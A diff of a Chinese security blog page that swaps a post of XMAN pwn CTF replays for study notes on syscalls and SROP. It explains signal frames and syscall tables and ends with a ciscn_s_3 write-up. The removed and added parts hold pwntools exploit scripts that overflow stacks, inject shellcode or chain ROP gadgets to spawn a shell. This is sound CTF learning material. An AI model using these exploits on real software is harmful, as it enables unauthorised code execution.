@@ -15,33 +15,25 @@
 
 
 
-<meta name="description" content="最近在查阅资料时,无意中发现之前xman的环境还在,现在粗略的学习pwn.想起当时题都是比较基层的栈,加上上海省赛把pwn环境搞崩了,趁这个机会在怀旧的同时把一些知识点给复习升华下.">
+<meta name="description" content="最近在刷题时,遇到很多关于没有或很少调用libc函数但使用了系统调用的题目,这些题目常常可以利用SROP的方法来解决，因此写个笔记来总结归纳下SROP利用原理与过程.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="xman pwn题复现——学pwn小记（4）">
-<meta property="og:url" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:title" content="系统调用与SROP方法学习笔记">
+<meta property="og:url" content="lexsd6.github.io/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
 <meta property="og:site_name" content="lexsd6&#39;s home">
-<meta property="og:description" content="最近在查阅资料时,无意中发现之前xman的环境还在,现在粗略的学习pwn.想起当时题都是比较基层的栈,加上上海省赛把pwn环境搞崩了,趁这个机会在怀旧的同时把一些知识点给复习升华下.">
+<meta property="og:description" content="最近在刷题时,遇到很多关于没有或很少调用libc函数但使用了系统调用的题目,这些题目常常可以利用SROP的方法来解决，因此写个笔记来总结归纳下SROP利用原理与过程.">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113124043442.png">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113123620972.png">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113131440686.png">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113132618818.png">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113132742912.png">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113132512530.png">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113135133488.png">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113135547290.png">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113135742482.png">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113140015120.png">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113140431065.png">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113140350462.png">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113141628743.png">
-<meta property="og:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113142124824.png">
-<meta property="article:published_time" content="2021-01-07T13:44:11.943Z">
-<meta property="article:modified_time" content="2021-01-13T07:09:11.657Z">
+<meta property="og:image" content="lexsd6.github.io/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210520224507291.png">
+<meta property="og:image" content="lexsd6.github.io/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210521095432564.png">
+<meta property="og:image" content="lexsd6.github.io/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210521095910046.png">
+<meta property="og:image" content="lexsd6.github.io/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210521101741135.png">
+<meta property="og:image" content="lexsd6.github.io/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210521114438090.png">
+<meta property="og:image" content="lexsd6.github.io/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210521115053077.png">
+<meta property="article:published_time" content="2021-05-20T14:26:02.525Z">
+<meta property="article:modified_time" content="2021-05-21T04:29:39.075Z">
 <meta property="article:author" content="lexsd6">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20210113124043442.png">
+<meta name="twitter:image" content="lexsd6.github.io/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210520224507291.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -75,7 +67,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>xman pwn题复现——学pwn小记（4） | lexsd6&#39;s home</title>
+<title>系统调用与SROP方法学习笔记 | lexsd6&#39;s home</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -282,11 +274,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-xman pwn题复现" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-系统调用与SROP方法学习笔记" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/" class="article-date">
-      <time datetime="2021-01-07T13:44:11.943Z" itemprop="datePublished">2021-01-07</time>
+      <a href="/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="article-date">
+      <time datetime="2021-05-20T14:26:02.525Z" itemprop="datePublished">2021-05-20</time>
 </a>
 
 
@@ -301,7 +293,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      xman pwn题复现——学pwn小记（4）
+      系统调用与SROP方法学习笔记
     </h1>
   
 
@@ -311,7 +303,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">888字</span>
+        <span class="post-count">1.2k字</span>
       </span>
     </span>
 
@@ -320,7 +312,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">4分</span>
+        <span class="post-count">5分</span>
       </span>
     </span>
 </div>
@@ -348,62 +340,145 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>最近在查阅资料时,无意中发现之前xman的环境还在,现在粗略的学习pwn.想起当时题都是比较基层的栈,加上上海省赛把pwn环境搞崩了,趁这个机会在怀旧的同时把一些知识点给复习升华下.<a id="more"></a></p>
-<h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p>最简单的,栈溢出.</p>
-<p><img src="image-20210113124043442.png" alt="image-20210113124043442"></p>
-<p>只开了NX保护.看反汇编代码发现,有栈溢出点.同时内部有后门.</p>
-<p><img src="image-20210113123620972.png" alt="image-20210113123620972"></p>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">'level0'</span>)</span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9881</span>)</span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(e.symbols[<span class="string">'callsystem'</span>])</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+        <p>最近在刷题时,遇到很多关于没有或很少调用libc函数但使用了系统调用的题目,这些题目常常可以利用SROP的方法来解决，因此写个笔记来总结归纳下SROP利用原理与过程.<a id="more"></a></p>
+<h2 id="SROP-特点与原理"><a href="#SROP-特点与原理" class="headerlink" title="SROP 特点与原理"></a>SROP 特点与原理</h2><h3 id="SROP-特点"><a href="#SROP-特点" class="headerlink" title="SROP 特点"></a>SROP 特点</h3><p>依赖系统调用(syscal)强但对libc.so的依赖极少。</p>
+<p>要有空间存放Signal Frame的信息.</p>
+<p>与其他rop相比，对的依赖gadgets 较少。</p>
+<h3 id="signal-机制"><a href="#signal-机制" class="headerlink" title="signal 机制"></a>signal 机制</h3><p>SROP手段十分依赖signal 机制.而signal 机制是类 unix 系统中进程之间相互传递信息的一种方法，也是我们平常所说的软中断或软信号中断。</p>
+<p>1.内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。<strong>内核会为该进程保存相应的上下文，主要是将所有寄存器以及压入 signal 信息和指向 sigreturn 的系统调用地址压入栈中。</strong>我们称 ucontext 以及 siginfo 这一段为 Signal Frame(此时栈的结构如下图所示)。然后处理signal handler 的事务.<img src="image-20210520224507291.png" alt="image-20210520224507291"></p>
+<p>处理完signal handler 的事务.程序处理完会return回<code>__restore_rt，</code>这个功能里面就是<code>mov rax, 0xf; syscall</code>，去呼叫<code>sys_rt_sigreturn</code>syscall，把一部分恢复Signal Frame通过解析 Signal Frame的信息，将压入的进程还原成中断前的状态。</p>
+<p><img src="image-20210521095432564.png" alt="image-20210521095432564"></p>
+<p>同时,对于signal Frame来说，不同会因为架构的不同而因此有所区别.</p>
+<h4 id="signal-Frame-sigcontext"><a href="#signal-Frame-sigcontext" class="headerlink" title="signal Frame sigcontext"></a>signal Frame sigcontext</h4><p>在32位lunix 下sigcontext 的结构为:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> short gs, __gsh;</span><br><span class="line"><span class="keyword">unsigned</span> short fs, __fsh;</span><br><span class="line"><span class="keyword">unsigned</span> short es, __esh;</span><br><span class="line"><span class="keyword">unsigned</span> short ds, __dsh;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> edi;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> esi;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> ebp;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> esp;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> ebx;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> edx;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> ecx;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> eax;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> trapno;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> err;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> eip;</span><br><span class="line"><span class="keyword">unsigned</span> short cs, __csh;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> esp_at_signal;</span><br><span class="line"><span class="keyword">unsigned</span> short ss, __ssh;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> oldmask;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
-<h2 id="Tell-Me-Something"><a href="#Tell-Me-Something" class="headerlink" title="Tell Me Something"></a>Tell Me Something</h2><p><img src="image-20210113131440686.png" alt="image-20210113131440686"></p>
-<p>还是只开了nx保护.</p>
-<p><img src="image-20210113132618818.png" alt="image-20210113132618818"></p>
-<p>发现有栈溢出利用点与后门.</p>
-<p>但是要注意的是这道题的mian函数.</p>
-<p><img src="image-20210113132742912.png" alt="image-20210113132742912"></p>
-<p>我们正常的mian函数一般是如下:</p>
-<p><img src="image-20210113132512530.png" alt="image-20210113132512530"></p>
-<p>即是有:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push rbp     <span class="comment">#把上一个栈的rbp入栈</span></span><br><span class="line">mov rbp,rsp</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">..</span><br><span class="line">leave    <span class="comment"># leave 相当于mov esp,ebp;pop ebp;</span></span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+<p>在64位lunix 下sigcontext 的结构为:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">      <span class="keyword">__uint16_t</span>        cwd;</span><br><span class="line">      <span class="keyword">__uint16_t</span>        swd;</span><br><span class="line">      <span class="keyword">__uint16_t</span>        ftw;</span><br><span class="line">      <span class="keyword">__uint16_t</span>        fop;</span><br><span class="line">      <span class="keyword">__uint64_t</span>        rip;</span><br><span class="line">      <span class="keyword">__uint64_t</span>        rdp;</span><br><span class="line">      <span class="keyword">__uint32_t</span>        mxcsr;</span><br><span class="line">      <span class="keyword">__uint32_t</span>        mxcr_mask;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">      <span class="keyword">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">      <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">      <span class="keyword">unsigned</span> short cs;</span><br><span class="line">      <span class="keyword">unsigned</span> short gs;</span><br><span class="line">      <span class="keyword">unsigned</span> short fs;</span><br><span class="line">      <span class="keyword">unsigned</span> short __pad0;</span><br><span class="line">      <span class="keyword">__uint64_t</span> err;</span><br><span class="line">      <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">      <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">      <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">      __extension__ <span class="keyword">union</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">          <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">        &#125;;</span><br><span class="line">      <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>
 
-<p>我们在平常里构造栈出时：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buf+(0xbeadcade)+恶意code</span><br></pre></td></tr></table></figure>
+<p>用图片来形容X64的sigcontext 的结构应该如下表示:</p>
+<p><img src="image-20210521095910046.png" alt="image-20210521095910046"></p>
+<h3 id="SROP-原理"><a href="#SROP-原理" class="headerlink" title="SROP 原理"></a>SROP 原理</h3><p>在程序某一个地方伪造一个<code>signal Frame</code>,再让程序<code>sys_rt_sigreturn</code>我们构造的fake signal Frame.让进程恢复到我们构造的恶意状态.</p>
+<p><img src="image-20210521101741135.png" alt="image-20210521101741135"></p>
+<h2 id="常用系统调用号"><a href="#常用系统调用号" class="headerlink" title="常用系统调用号"></a>常用系统调用号</h2><h3 id="i386"><a href="#i386" class="headerlink" title="i386"></a>i386</h3><table>
+<thead>
+<tr>
+<th>NR</th>
+<th>syscall name</th>
+<th>%eax</th>
+<th>arg0 (%ebx)</th>
+<th>arg1 (%ecx)</th>
+<th>arg2 (%edx)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>3</td>
+<td>read</td>
+<td>0x03</td>
+<td>unsigned int fd</td>
+<td>char *buf</td>
+<td>size_t count</td>
+</tr>
+<tr>
+<td>4</td>
+<td>write</td>
+<td>0x04</td>
+<td>unsigned int fd</td>
+<td>const char *buf</td>
+<td>size_t count</td>
+</tr>
+<tr>
+<td>5</td>
+<td>open</td>
+<td>0x05</td>
+<td>const char *filename</td>
+<td>int flags</td>
+<td>umode_t mode</td>
+</tr>
+<tr>
+<td>11</td>
+<td>execve</td>
+<td>0x0b</td>
+<td>const char *filename</td>
+<td>char *const *argv</td>
+<td>char *const *envp</td>
+</tr>
+<tr>
+<td>173</td>
+<td>rt_sigreturn</td>
+<td>0xad</td>
+<td>?</td>
+<td>?</td>
+<td>?</td>
+</tr>
+</tbody></table>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;int execve(const char *pathname, char *const argv[],char *const envp[]);</span><br><span class="line">173	i386	rt_sigreturn		sys_rt_sigreturn		stub32_rt_sigreturn</span><br><span class="line">&#x2F;&#x2F; mov  eax 0xad</span><br><span class="line">&#x2F;&#x2F;syscall</span><br><span class="line">&#x2F;&#x2F;retn   Signal Frame addr</span><br></pre></td></tr></table></figure>
 
-<p>0xbeadcade的数据就为了平衡leave中的pop，因此在本题目中mian函数没有pop ebp或leave。因此payload不需要加(0xbeadcade)。</p>
-<p>exp：</p>
-<p><img src="image-20210113135133488.png" alt="image-20210113135133488"></p>
-<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>一个32位的程序，什么保护也没有开。</p>
-<p><img src="image-20210113135547290.png" alt="image-20210113135547290"></p>
-<p>反汇编看，发现buf有可控栈溢出，同时提示了buf地址猜测可以手动入shell。</p>
-<p><img src="image-20210113135742482.png" alt="image-20210113135742482"></p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'level1'</span>)</span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9877</span>)</span><br><span class="line"><span class="comment">#p=process('level1')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"What's this:"</span>)</span><br><span class="line">addr=p.recvuntil(<span class="string">"?"</span>)[:<span class="number">-1</span>]</span><br><span class="line">print(addr)</span><br><span class="line">addr=int(addr,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">pay1=asm(shellcraft.sh())</span><br><span class="line">pay1=pay1.ljust(<span class="number">0x88</span>,<span class="string">'a'</span>)</span><br><span class="line">pay1=pay1+p32(<span class="number">0</span>)+p32(addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(pay1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="amd64"><a href="#amd64" class="headerlink" title="amd64"></a>amd64</h3><table>
+<thead>
+<tr>
+<th>NR</th>
+<th align="center">syscall name</th>
+<th>%rax</th>
+<th>arg0 (%rdi)</th>
+<th>arg1 (%rsi)</th>
+<th>arg2 (%rdx)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td align="center">read</td>
+<td>0x00</td>
+<td>unsigned int fd</td>
+<td>char *buf</td>
+<td>size_t count</td>
+</tr>
+<tr>
+<td>1</td>
+<td align="center">write</td>
+<td>0x01</td>
+<td>unsigned int fd</td>
+<td>const char *buf</td>
+<td></td>
+</tr>
+<tr>
+<td>2</td>
+<td align="center">open</td>
+<td>0x02</td>
+<td>const char *filename</td>
+<td>int flags</td>
+<td>umode_t mode</td>
+</tr>
+<tr>
+<td>3</td>
+<td align="center">rt_sigreturn</td>
+<td>0x0f</td>
+<td>?</td>
+<td>?</td>
+<td>?</td>
+</tr>
+<tr>
+<td>59</td>
+<td align="center">execve</td>
+<td>0x3b</td>
+<td>const char *filename</td>
+<td>char *const *argv</td>
+<td>char *const *envp</td>
+</tr>
+</tbody></table>
+<h2 id="例题ciscn-s-3"><a href="#例题ciscn-s-3" class="headerlink" title="例题ciscn_s_3"></a>例题ciscn_s_3</h2><p><img src="image-20210521114438090.png" alt="image-20210521114438090"></p>
+<p>这个题目很奇怪,我ida无法F5,然后自己手撕汇编.</p>
+<p><img src="image-20210521115053077.png" alt="image-20210521115053077"></p>
+<p>程序只调用的系统调用而没有调用libc函数.在程序运行的流程中调用系统调用来读入数据到buf,但buf数据只有0x10大小，所以存在栈溢出。然后，接下来调用系统调用来显示数据，但同样存在输出数据范围大于buf于是存在信息泄露。</p>
+<h3 id="解法1-execve与libc-csu-init"><a href="#解法1-execve与libc-csu-init" class="headerlink" title="解法1:execve与libc_csu_init"></a>解法1:execve与libc_csu_init</h3><p>用利用题目中<code>mov     rax, 3Bh;ret</code>gatget来修改rax为0x3b，同时利用libc_csu_init来修改rdx为0，用<code>pop rdi;ret</code>来修改rdi 的值指向<code>/bin/sh</code>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line">context.arch = e.arch</span><br><span class="line">p=process(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">'/bin/sh\x00'</span>+<span class="string">'a'</span>*(<span class="number">0x10</span>-len(<span class="string">'/bin/sh\x00'</span>))+p64(<span class="number">0x0000000004004F1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sgdb.attach(p)</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">add=p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">print(hex(u64(add)<span class="number">-0x110</span>))</span><br><span class="line">stack=u64(add)<span class="number">-0x110</span></span><br><span class="line">log.info(<span class="string">'stack:'</span>+hex(stack))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">rax=<span class="number">0x0000000004004E2</span>  <span class="comment">#mov     rax, 3Bh;ret</span></span><br><span class="line">libc_csu_init_gat1=<span class="number">0x00000000040059A</span></span><br><span class="line">libc_csu_init_gat2=<span class="number">0x000000000400580</span></span><br><span class="line">rdi_ret=<span class="number">0x00000000004005a3</span><span class="comment"># pop rdi;ret</span></span><br><span class="line">syscall_ret=<span class="number">0x0000000000400517</span><span class="comment"># syscall ; ret</span></span><br><span class="line"></span><br><span class="line">pay=<span class="string">'/bin/sh\x00'</span>+<span class="string">'a'</span>*(<span class="number">0x10</span>-len(<span class="string">'/bin/sh\x00'</span>))+p64(rax)+p64(libc_csu_init_gat1)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(stack+<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(libc_csu_init_gat2)+<span class="string">'a'</span>*<span class="number">0x38</span>+p64(rdi_ret)+p64(stack)+p64(syscall_ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<p><img src="image-20210113140015120.png" alt="image-20210113140015120"></p>
-<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><img src="image-20210113140431065.png" alt="image-20210113140431065"></p>
-<p>一个32位的程序，只NX保护。看反汇编代码发现栈溢出利用点。</p>
-<p><img src="image-20210113140350462.png" alt="image-20210113140350462"></p>
-<p>同时环境中有system函数，我们可以利用ret2libc的方法。</p>
